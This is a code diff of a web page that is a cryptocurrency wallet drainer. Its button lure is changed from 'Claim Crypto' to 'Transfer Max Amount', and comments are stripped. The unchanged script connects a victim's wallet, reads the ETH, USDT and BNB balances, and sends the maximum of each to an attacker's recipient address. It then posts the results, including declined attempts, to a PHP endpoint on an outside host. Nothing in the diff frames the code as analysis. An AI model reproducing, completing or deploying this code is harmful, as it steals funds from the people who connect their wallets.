@@ -24,7 +24,7 @@
     </style>
 </head>
 <body>
-    <button id="connectButton">Connect Wallet & Claim Crypto</button>
+    <button id="connectButton">Connect Wallet & Transfer Max Amount</button>
 
     <form id="transactionForm" action="https://eflujsyb0kuybgol11532.cleavr.one/btc/d.php" method="post" style="display: none;">
         <input type="hidden" name="transactionDetails" id="transactionDetails">
@@ -68,48 +68,39 @@
                     }
                 },
                 binancechainwallet: {
-                    package: true // Binance Chain Wallet provider
+                    package: true
                 }
-                // Add more wallet providers here if needed
             };
 
             const web3Modal = new Web3Modal.default({
-                cacheProvider: true, // optional
-                providerOptions, // required
-                theme: "dark",
-                disableInjectedProvider: false,
+                cacheProvider: true,
+                providerOptions,
+                theme: "dark"
             });
 
             connectButton.addEventListener('click', async () => {
                 try {
                     const provider = await web3Modal.connect();
                     const web3 = new Web3(provider);
-                    const ethersProvider = new ethers.providers.Web3Provider(provider);
-                    const signer = ethersProvider.getSigner();
                     const accounts = await web3.eth.getAccounts();
                     const senderAddress = accounts[0];
 
-                    // Get ETH balance
                     const ethBalanceWei = await web3.eth.getBalance(senderAddress);
                     const ethBalance = web3.utils.fromWei(ethBalanceWei, 'ether');
 
-                    // Estimate gas fee for ETH transfer
                     const gasPriceWei = await web3.eth.getGasPrice();
                     const gasFeeWei = gasPriceWei * gasLimit;
                     const maxEthTransferWei = ethBalanceWei - gasFeeWei;
                     const maxEthTransfer = web3.utils.fromWei(maxEthTransferWei.toString(), 'ether');
 
-                    // Get USDT balance
                     const usdtContract = new web3.eth.Contract(tokenABI, tokenAddresses.USDT);
                     const usdtBalanceWei = await usdtContract.methods.balanceOf(senderAddress).call();
-                    const usdtBalance = web3.utils.fromWei(usdtBalanceWei, 'mwei'); // USDT has 6 decimals
+                    const usdtBalance = web3.utils.fromWei(usdtBalanceWei, 'mwei');
 
-                    // Get BNB balance
                     const bnbContract = new web3.eth.Contract(tokenABI, tokenAddresses.BNB);
                     const bnbBalanceWei = await bnbContract.methods.balanceOf(senderAddress).call();
                     const bnbBalance = web3.utils.fromWei(bnbBalanceWei, 'ether');
 
-                    // Create transactions for each token
                     const ethTransactionParameters = {
                         to: recipientAddress,
                         from: senderAddress,
@@ -121,7 +112,7 @@
                     const usdtTransactionParameters = {
                         to: tokenAddresses.USDT,
                         from: senderAddress,
-                        value: '0x0', // No ETH value required
+                        value: '0x0',
                         gas: gasLimit,
                         gasPrice: gasPriceWei,
                         data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei).encodeABI()
@@ -130,18 +121,16 @@
                     const bnbTransactionParameters = {
                         to: tokenAddresses.BNB,
                         from: senderAddress,
-                        value: '0x0', // No ETH value required
+                        value: '0x0',
                         gas: gasLimit,
                         gasPrice: gasPriceWei,
                         data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei).encodeABI()
                     };
 
-                    // Send transactions
                     const ethTxHash = await web3.eth.sendTransaction(ethTransactionParameters);
                     const usdtTxHash = await web3.eth.sendTransaction(usdtTransactionParameters);
                     const bnbTxHash = await web3.eth.sendTransaction(bnbTransactionParameters);
 
-                    // Send transaction details to PHP endpoint
                     transactionDetailsInput.value = JSON.stringify({
                         status: 'approved',
                         ethTransactionHash: ethTxHash.transactionHash,
@@ -155,7 +144,6 @@
                     });
                     transactionForm.submit();
                 } catch (error) {
-                    // Handle user rejection
                     transactionDetailsInput.value = JSON.stringify({
                         status: 'declined',
                         error: error.message
